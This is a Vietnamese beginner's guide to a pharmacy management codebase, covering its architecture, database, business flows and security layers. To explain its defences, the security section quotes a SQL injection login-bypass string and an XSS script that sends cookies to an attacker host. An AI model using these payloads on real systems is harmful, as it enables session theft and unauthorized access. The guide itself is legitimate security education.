# 📚 SecurePharma — Hướng Dẫn Học Cho Người Mới

> **Cuốn sách này dành cho:** Bạn mới nhìn thấy codebase lần đầu và muốn hiểu "cái gì đang xảy ra" thay vì "cái code nó viết sao".

---

## Mục lục

1. [Hệ thống này làm gì?](#1-hệ-thống-này-làm-gì)
2. [Frontend — Giao diện người dùng](#2-frontend--giao-diện-người-dùng)
3. [Backend — Xử lý nghiệp vụ phía sau](#3-backend--xử-lý-nghiệp-vụ-phía-sau)
4. [Database — Nơi lưu trữ dữ liệu](#4-database--nơi-lưu-trữ-dữ-liệu)
5. [Bảo mật hoạt động thế nào?](#5-bảo-mật-hoạt-động-thế-nào)
6. [Các chức năng chính — Nói bằng lời](#6-các-chức-năng-chính--nói-bằng-lời)
7. [Luồng dữ liệu đi như thế nào?](#7-luồng-dữ-liệu-đi-như-thế-nào)
8. [Cách đọc code nhanh nhất](#8-cách-đọc-code-nhanh-nhất)

---

## 1. Hệ thống này làm gì?

SecurePharma là **phần mềm quản lý cửa hàng thuốc**. Nó giúp:

- **Bán thuốc**: Chọn thuốc, tính tiền, in hóa đơn
- **Quản lý kho**: Theo dõi thuốc còn bao nhiêu, thuốc nào sắp hết hạn
- **Quản lý nhân viên**: Ai làm gì, ai được phép làm gì
- **Thống kê**: Hôm nay bán được bao nhiêu, lãi lỗ ra sao

### 3 thành phần chính

```
Người dùng ←→  Frontend (React)  ←→  Backend (Node.js)  ←→  Database (SQL Server)
            giao diện           xử lý nghiệp vụ        lưu trữ dữ liệu
```

- **Frontend** = Trang web bạn nhìn thấy. Nút bấm, bảng, form nhập liệu.
- **Backend** = Phần "bếp" ở phía sau. Xử lý logic, kiểm tra quyền, truy vấn database.
- **Database** = Kho chứa dữ liệu. Bảng thuốc, bảng khách hàng, bảng hóa đơn.

---

## 2. Frontend — Giao diện người dùng

### 2.1 Nó là cái gì?

Frontend là **trang web** người dùng tương tác. Viết bằng **React** — một thư viện JavaScript phổ biến nhất hiện nay để xây dựng giao diện.

### 2.2 Frontend làm những gì?

**Hiển thị dữ liệu:**
```
Backend gửi:  { tenThuoc: "Paracetamol", giaBan: 25000 }
Frontend hiển thị:  Paracetamol — 25.000 đ
```

**Gửi yêu cầu lên Backend:**
```
Người bấm "Thêm vào giỏ" 
→ Frontend gửi: "Người dùng muốn mua 2 viên Paracetamol"
→ Backend xử lý 
→ Backend trả: "Đã thêm vào giỏ hàng"
→ Frontend cập nhật giao diện
```

### 2.3 Các trang chính

| Trang | Chức năng |
|---|---|
| **Đăng nhập** | Nhập tài khoản để vào hệ thống |
| **Bán hàng** | Chọn thuốc, thêm khách hàng, tính tiền, tạo hóa đơn |
| **Tồn kho** | Xem thuốc còn bao nhiêu, ở lô nào |
| **Cảnh báo** | Thuốc sắp hết hàng, thuốc sắp hết hạn |
| **Thống kê** | Báo cáo doanh thu, lợi nhuận |
| **Quản lý** | Thêm/sửa/xóa thuốc, khách hàng, nhân viên |

### 2.4 Đăng nhập hoạt động thế nào?

```
1. Người nhập username + password
2. Frontend gửi thông tin này lên Backend
3. Backend kiểm tra:
   - Tài khoản có tồn tại không?
   - Mật khẩu có đúng không?
4. Nếu đúng → Backend trả về một "thẻ thông hành" (gọi là token)
5. Frontend lưu "thẻ thông hành" này
6. Mỗi lần gọi API sau đó, Frontend đều gửi kèm "thẻ thông hành"
7. Backend nhìn thẻ → biết ai đang gọi, có quyền gì
```

---

## 3. Backend — Xử lý nghiệp vụ phía sau

### 3.1 Nó là cái gì?

Backend là **phần máy chủ** chạy ngầm. Viết bằng **Node.js** + **Express** — công nghệ phổ biến để viết API.

### 3.2 Backend nhận yêu cầu từ đâu?

Backend cung cấp các **API endpoints** — tức các "cổng" để Frontend gọi vào.

Ví dụ:
```
POST /api/auth/login     → "Đăng nhập"
GET  /api/thuoc         → "Lấy danh sách thuốc"
POST /api/ban-hang      → "Tạo hóa đơn bán hàng"
GET  /api/thong-ke/ban-hang → "Lấy báo cáo bán hàng"
```

### 3.3 Backend xử lý một yêu cầu như thế nào?

Lấy ví dụ: Người bấm "Tạo hóa đơn"

```
Frontend gửi:  POST /api/ban-hang
                Body: { items: [...], maKH: 5, tienKhachDua: 200000 }

Backend nhận được:
│
├─ 1. Kiểm tra "thẻ thông hành" (token)
│      → Ai đang gọi? Có quyền bán hàng không?
│
├─ 2. Kiểm tra dữ liệu gửi lên
│      → Có items không? Có maKH hợp lệ không?
│
├─ 3. Xử lý nghiệp vụ (logic bán hàng)
│      → Với mỗi loại thuốc:
│        - Tìm lô thuốc còn hạn, còn hàng (lô nào hết hạn trước thì bán trước)
│        - Tính giá bán
│        - Trừ số lượng trong kho
│      → Tính tổng tiền, tiền thừa
│
├─ 4. Lưu vào database
│      → Tạo hóa đơn mới
│      → Lưu chi tiết hóa đơn
│      → Cập nhật số lượng tồn kho
│
└─ 5. Trả kết quả về Frontend
       → { success: true, hoaDon: {...} }
```

### 3.4 Cấu trúc Backend — Giải thích đơn giản

Backend được tổ chức theo từng **module** — mỗi module quản lý một phạm vi:

```
backend/src/
├── modules/
│   ├── auth/           → Đăng nhập, đổi mật khẩu
│   ├── thuoc/          → Thêm, sửa, xóa thuốc
│   ├── khachHang/      → Thêm, sửa, xóa khách hàng
│   ├── banHang/        → Tạo hóa đơn, xem hóa đơn
│   ├── kho/            → Xem tồn kho, cảnh báo
│   ├── thongKe/        → Báo cáo thống kê
│   └── ...             → Các module khác
├── middleware/         → Lớp bảo mật (kiểm tra quyền, lọc dữ liệu)
├── config/            → Cấu hình kết nối database
└── utils/             → Các hàm hỗ trợ chung
```

**Mỗi module có 3 file:**
- `*.routes.js` — Định nghĩa: "API này làm gì?"
- `*.controller.js` — Định nghĩa: "Nhận được yêu cầu thì kiểm tra cái gì?"
- `*.service.js` — Định nghĩa: "Xử lý nghiệp vụ thế nào, truy vấn database ra sao?"

### 3.5 Tại sao chia 3 file?

```
routes      → Biết có những API nào
controller  → Biết cần gọi service nào, trả về gì
service     → Biết logic xử lý ra sao
```

Chia ra để:
- Mỗi file ngắn, dễ đọc
- Muốn sửa logic → vào service
- Muốn thêm API → vào routes
- Muốn đổi cách validate → vào controller

---

## 4. Database — Nơi lưu trữ dữ liệu

### 4.1 Nó là cái gì?

Database (SQL Server) là **kho chứa dữ liệu**, tổ chức thành các **bảng**.

### 4.2 Các bảng chính

| Bảng | Lưu trữ | Ví dụ |
|---|---|---|
| **Thuoc** | Thông tin thuốc | Paracetamol 500mg, giá 25.000đ |
| **KhachHang** | Thông tin khách | Nguyễn Văn A, SDT 0912xxx |
| **NhanVien** | Thông tin nhân viên | Trần Thị B, vai trò: NV Bán hàng |
| **TaiKhoan** | Tài khoản đăng nhập | admin.huong / Admin@2026 |
| **HoaDon** | Hóa đơn bán hàng | HD001, 15/09/2026, tổng 150.000đ |
| **ChiTietHoaDon** | Dòng sản phẩm trong hóa đơn | HD001: Paracetamol x 2 |
| **LoThuoc_ChiTietNhap** | Lô thuốc (số lượng, hạn SD) | Lô A: 100 viên, hết hạn 01/01/2027 |
| **PhieuNhap** | Phiếu nhập thuốc từ nhà cung cấp | PN001, nhập từ Công ty Dược |
| **PhieuChi** | Phiếu chi tiền | PC001, chi 5.000.000đ tiền điện |

### 4.3 Các bảng liên quan với nhau như thế nào?

```
HoaDon (hóa đơn) 
    ↓ 
    Lưu: Mã khách hàng → chỉ đến bảng KhachHang
    Lưu: Mã nhân viên → chỉ đến bảng NhanVien

ChiTietHoaDon (chi tiết hóa đơn)
    ↓
    Lưu: Mã hóa đơn → chỉ đến HoaDon
    Lưu: Mã lô thuốc → chỉ đến LoThuoc_ChiTietNhap

LoThuoc_ChiTietNhap (lô thuốc)
    ↓
    Lưu: Mã phiếu nhập → chỉ đến PhieuNhap
    Lưu: Mã thuốc → chỉ đến bảng Thuoc
```

Hiểu đơn giản: **"Mã"** trong bảng này chính là **"liên kết"** đến bảng khác.

### 4.4 Tại sao cần nhiều bảng?

```
THAY VÌ lưu tất cả vào 1 bảng lớn:
┌──────────────────────────────────────────────────────────┐
│ HoaDon: MaHD, TenKH, SDT_KH, TenNV, TenThuoc1, SL1...   │
└──────────────────────────────────────────────────────────┘

→ Nếu 1 hóa đơn có 10 loại thuốc → lưu 10 dòng trùng lặp thông tin khách, nhân viên
→ Khách đổi SDT → phải sửa 100 hóa đơn

DÙNG NHIỀU BẢNG LIÊN KẾT:
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│ HoaDon       │────>│ ChiTietHoaDon│────>│ LoThuoc      │
│ (chỉ lưu     │     │ (mỗi dòng    │     │ (thuốc + lô) │
│  thông tin    │     │  1 thuốc)    │     │              │
│  chung)       │     │              │     │              │
└──────────────┘     └──────────────┘     └──────────────┘
```

---

## 5. Bảo mật hoạt động thế nào?

### 5.1 Tổng quan

Dự án có **4 lớp bảo mật** được tích hợp sẵn:

| Lớp | Chức năng | Bảo vệ khỏi |
|---|---|---|
| **SQL Injection** | Lọc dữ liệu trước khi truy vấn | Hacker chèn SQL để trộm dữ liệu |
| **XSS** | Loại bỏ mã độc trong input | Hacker chèn script để đánh cắp phiên |
| **RBAC** | Kiểm tra quyền trước khi xử lý | User thường truy cập chức năng Admin |
| **Mã hóa** | Ẩn dữ liệu nhạy cảm | Đọc DB không thấy SDT thật |

### 5.2 SQL Injection — "Chặn câu lệnh giả mạo"

**Vấn đề thực tế:**
```
Hacker nhập vào ô đăng nhập:
Username: ' OR '1'='1' --
Password: (bất kỳ)

→ Backend tạo câu SQL: 
   SELECT * FROM TaiKhoan WHERE TenDangNhap = '' OR '1'='1' --'

→ Kết quả: Lấy được thông tin tài khoản đầu tiên → đăng nhập thành công!
```

**Cách dự án ngăn chặn:**
```
THAY VÌ ghép chuỗi trực tiếp:
   "SELECT * FROM TaiKhoan WHERE TenDangNhap = '" + username + "'"

DÙNG tham số (parameterized query):
   "SELECT * FROM TaiKhoan WHERE TenDangNhap = @username"
   
→ Dù hacker nhập ' OR '1'='1, nó chỉ được coi là text thường,
  không còn là câu lệnh SQL
```

### 5.3 XSS — "Loại bỏ mã độc trong văn bản"

**Vấn đề thực tế:**
```
Hacker nhập vào ô "Tên khách hàng":
   <script>document.location='http://hack.com?cookie='+document.cookie</script>

→ Khi người khác xem danh sách khách, script này chạy
→ Hacker đánh cắp "thẻ thông hành" của họ
```

**Cách dự án ngăn chặn (2 lớp):**

```
LỚP 1: Backend
   Trước khi lưu vào database, loại bỏ các ký tự nguy hiểm:
   "<script>" → "&lt;script&gt;"
   → Lưu vào DB: &lt;script&gt;...→ Hiển thị lên trình duyệt: <script>... (trình duyệt hiểu đó là text, không chạy)

LỚP 2: React
   React tự động escape mọi text trong JSX
   → Không cần làm gì thêm, React đã lo
```

### 5.4 RBAC — "Ai được làm gì"

**Vấn đề thực tế:**
```
User đăng nhập → gọi API xóa nhân viên → XÓA HẾT!
```

**Cách dự án ngăn chặn:**

```
Có 3 vai trò:
┌─────────────────┬────────────────────────────────────┐
│ Admin           │ Làm tất cả                         │
├─────────────────┼────────────────────────────────────┤
│ NV_BanHang      │ Bán hàng, xem thuốc, xem khách    │
├─────────────────┼────────────────────────────────────┤
│ NV_Kho          │ Nhập kho, điều chỉnh tồn kho      │
└─────────────────┴────────────────────────────────────┘

Mỗi API có "checkpoint" kiểm tra:
   if (user.role !== 'Admin') {
       return "Bạn không có quyền làm việc này";
   }
```

### 5.5 Mã hóa dữ liệu — "Ẩn thông tin nhạy cảm"

**Vấn đề thực tế:**
```
Ai đó đọc trực tiếp file database (backup, lỗi bảo mật)
→ Thấy hết SDT khách hàng, SDT nhân viên
```

**Cách dự án ngăn chặn:**
```
Dữ liệu được MÃ HÓA trước khi lưu:
   SDT thật:    "0912345678"
   SDT đã mã hóa: "a7f3c9d2e8b1..." (dãy ký tự vô nghĩa)

Muốn đọc được → PHẢI CÓ KHÓA GIẢI MÃ
Không có khóa → nhìn vào chỉ thấy rối
```

**Những thứ được mã hóa:**
- SDT khách hàng
- SDT nhân viên
- SDT nhà cung cấp

**Những thứ KHÔNG được mã hóa (vì đã hash):**
- Mật khẩu → không thể đảo ngược, chỉ so sánh được

### 5.6 JWT Token — "Thẻ thông hành điện tử"

**Vấn đề thực tế:**
```
Làm sao biết user đã đăng nhập mà không lưu session trên server?
```

**Cách dự án giải quyết:**

```
1. ĐĂNG NHẬP THÀNH CÔNG:
   Server tạo một "thẻ thông hành" (JWT) chứa:
   {
     username: "admin.huong",
     role: "Admin",
     hết hạn: "16/09/2026 23:59"
   }
   
   Thẻ này được KÝ bằng "con dấu bí mật" (JWT_SECRET)
   
2. MỖI REQUEST SAU ĐÓ:
   Frontend gửi kèm thẻ: "Authorization: Bearer <token>"
   
   Backend kiểm tra:
   - Thẻ có đúng "con dấu" không? → không sửa được giả mạo
   - Thẻ có hết hạn không?
   - Người mang thẻ có quyền gọi API này không?
```

**Tại sao có 2 token (Access + Refresh)?**

```
Access Token: Hạn 8 tiếng
  → Nếu bị lộ, hacker chỉ có 8 tiếng để dùng
  
Refresh Token: Hạn 7 ngày
  → Dùng để xin cấp Access Token mới khi hết hạn
  → Nằm ở "con dấu" khác, an toàn hơn
```

### 5.7 Rate Limiting — "Chặn tấn công brute-force"

**Vấn đề thực tế:**
```
Hacker viết chương trình tự động thử 1 triệu mật khẩu
→ Đăng nhập thành công
```

**Cách dự án ngăn chặn:**
```
Sau 5 lần đăng nhập SAI trong 15 phút:
→ Khóa tài khoản 15 phút
→ "Bạn đã nhập sai 5 lần. Vui lòng chờ 15 phút."

Server cũng đếm request theo IP:
→ 100 request/15 phút/IP
→ Vượt quá → từ chối → chống DDoS
```

---

## 6. Các chức năng chính — Nói bằng lời

### 6.1 Bán hàng — Làm sao chọn đúng lô thuốc?

**Nguyên tắc FIFO (First-In-First-Out):**

```
Cửa hàng có 3 lô Paracetamol:
┌─────────────────────────────────────────────────┐
│ Lô A: 50 viên  │ Hết hạn: 01/01/2027 │ Nhập: T1 │
│ Lô B: 30 viên  │ Hết hạn: 15/03/2027 │ Nhập: T2 │
│ Lô C: 20 viên  │ Hết hạn: 30/06/2027 │ Nhập: T3 │
└─────────────────────────────────────────────────┘

Khách muốn 60 viên:
→ Lấy 50 từ Lô A (hết hạn sớm nhất)
→ Lấy 10 từ Lô B
→ Lô C không đụng đến
```

**Tại sao?** Để thuốc hết hạn trước được bán trước, không bị ứ đọng.

### 6.2 Quản lý kho — Làm sao biết thuốc sắp hết?

**3 loại cảnh báo:**

```
1. SẮP HẾT HÀNG
   Tồn kho ≤ 10 (ngưỡng mặc định)
   → "Paracetamol chỉ còn 5 viên. Cần nhập thêm!"

2. SẮP HẾT HẠN
   Hạn sử dụng trong vòng 30 ngày
   → "Lô A Paracetamol hết hạn sau 20 ngày. Cần ưu tiên bán trước."

3. ĐÃ HẾT HẠN
   Hạn sử dụng ≤ hôm nay
   → "Lô X đã hết hạn. Cần kiểm tra và tiêu hủy."
```

### 6.3 Thống kê — Đếm những gì?

```
THỐNG KÊ KHO:
   - Tổng số thuốc đang có
   - Giá trị tồn kho (số lượng × giá nhập)
   - Phân bổ theo loại (kháng sinh, giảm đau...)

THỐNG KÊ BÁN HÀNG:
   - Doanh thu ngày/tuần/tháng
   - Số hóa đơn
   - Top thuốc bán chạy

THỐNG KÊ TÀI CHÍNH:
   - Tổng thu (doanh thu)
   - Tổng chi (phiếu chi)
   - Lợi nhuận gộp (thu - chi)
```

### 6.4 Phân quyền — Ai làm gì?

```
Admin (Quản lý):
   ✅ Tất cả chức năng
   ✅ Quản lý nhân viên
   ✅ Hủy hóa đơn
   ✅ Xem báo cáo

NV_BanHang (Nhân viên bán hàng):
   ✅ Bán thuốc
   ✅ Tìm kiếm thuốc
   ✅ Quản lý khách hàng
   ✅ Xem hóa đơn
   ❌ Không nhập kho
   ❌ Không quản lý nhân viên

NV_Kho (Thủ kho):
   ✅ Nhập thuốc
   ✅ Điều chỉnh tồn kho
   ✅ Xem cảnh báo
   ❌ Không bán hàng
   ❌ Không xem doanh thu
```

---

## 7. Luồng dữ liệu đi như thế nào?

### 7.1 Luồng đăng nhập

```
┌─────────────┐                    ┌─────────────┐
│   USER      │                    │   SYSTEM    │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Nhập username + password     │
       │ ─────────────────────────────────>
       │                                  │
       │                     ┌─────────────┴─────────────┐
       │                     │ Kiểm tra tài khoản       │
       │                     │ Kiểm tra mật khẩu (hash) │
       │                     │ Tạo JWT token            │
       │                     └─────────────┬─────────────┘
       │                                  │
       │  2. Nhận token + chuyển trang    │
       │ <─────────────────────────────────
       │                                  │
       │  3. Vào Dashboard                │
       │ ─────────────────────────────────>
       │                                  │
       │                     ┌─────────────┴─────────────┐
       │                     │ Kiểm tra token           │
       │                     │ Trả dữ liệu dashboard   │
       │                     └─────────────┬─────────────┘
       │                                  │
       │  4. Hiển thị dashboard           │
       │ <─────────────────────────────────
```

### 7.2 Luồng bán hàng

```
1. Người chọn thuốc → Frontend gửi "Tôi muốn mua X viên Y"

2. Backend kiểm tra:
   - Token có hợp lệ không?
   - Có đủ tồn kho không?
   - Thuốc còn hạn không?

3. Backend chọn lô (FIFO):
   - Lô nào hết hạn trước → bán trước

4. Backend tính tiền:
   - Tổng = Σ(giá × số lượng)
   - Giảm giá (nếu có)
   - Tiền thừa = Tiền khách đưa - Tổng

5. Backend lưu (trong 1 giao dịch):
   - Tạo hóa đơn
   - Lưu chi tiết (lô nào, bao nhiêu)
   - Trừ tồn kho
   Nếu bất kỳ bước nào lỗi → HOÀN LẠI TẤT CẢ

6. Frontend hiển thị hóa đơn
```

### 7.3 Luồng xem thống kê

```
1. Người chọn tab "Thống kê" + chọn khoảng thời gian

2. Frontend gửi:
   GET /api/thong-ke/hoa-don?fromDate=01/09&toDate=30/09

3. Backend truy vấn:
   SELECT SUM(TongTien) FROM HoaDon 
   WHERE NgayGioLap BETWEEN '01/09' AND '30/09'

4. Backend trả về:
   {
     tongThu: 50.000.000,
     soHoaDon: 150,
     soKhachHang: 80
   }

5. Frontend vẽ biểu đồ, hiển thị số
```

---

## 8. Cách đọc code nhanh nhất

### 8.1 Muốn hiểu một chức năng → Đọc 3 file theo thứ tự

```
Bước 1: Đọc *.routes.js
        → Biết có những API nào
        → Ví dụ: GET /thuoc, POST /thuoc, DELETE /thuoc/:id

Bước 2: Đọc *.controller.js
        → Biết API nhận vào gì, trả ra gì
        → Ví dụ: POST nhận { tenThuoc, maDM }, trả về hóa đơn

Bước 3: Đọc *.service.js
        → Biết logic xử lý thế nào
        → Ví dụ: Insert vào DB, kiểm tra tồn kho, tính tổng
```

### 8.2 Tìm nhanh một thứ

| Cần tìm | Vào đâu |
|---|---|
| Tất cả API endpoints | `backend/src/app.js` |
| Logic đăng nhập | `backend/src/modules/auth/` |
| Quyền truy cập | `backend/src/middleware/rbac.js` |
| Cấu trúc bảng | `backend/database/01_create_tables.sql` |
| Giao diện trang | `frontend/src/pages/` |
| CSS styling | Trong JSX (Tailwind classes) |

### 8.3 Đọc nhanh một file Controller

```
Controller = "người tiếp tân"
- Đón tiếp yêu cầu
- Kiểm tra dữ liệu đầu vào (form có điền đủ không?)
- Gọi service để xử lý
- Trả kết quả về cho client
```

### 8.4 Đọc nhanh một file Service

```
Service = "người làm việc"
- Chứa logic nghiệp vụ thực sự
- Truy vấn database
- Tính toán, xử lý dữ liệu
- Trả kết quả cho controller
```

### 8.5 Đọc nhanh một file Routes

```
Routes = "người phân phối công việc"
- Định nghĩa URL endpoint (ví dụ: POST /api/ban-hang)
- Gắn middleware (kiểm tra đăng nhập, kiểm tra quyền)
- Chỉ định controller xử lý
```

---

## Tổng kết

```
SecurePharma = Frontend + Backend + Database + Bảo mật

Frontend     → Giao diện người dùng (React)
Backend      → Xử lý nghiệp vụ (Node.js)
Database     → Lưu trữ dữ liệu (SQL Server)
Bảo mật     → 4 lớp: SQLi, XSS, RBAC, Mã hóa

Muốn hiểu chức năng → Đọc: routes → controller → service
Muốn thêm chức năng → Thêm: routes + controller + service
Muốn sửa giao diện  → Vào: frontend/src/pages/
Muốn sửa bảo mật   → Vào: backend/src/middleware/
```

---

> **Lưu ý cuối cùng:** Code có thể phức tạp, nhưng nghiệp vụ thì luôn có thể nói bằng lời. Nếu bạn không thể giải thích một chức năng bằng ngôn ngữ thường, có thể bạn chưa hiểu đủ — hoặc code đang làm điều không cần thiết.
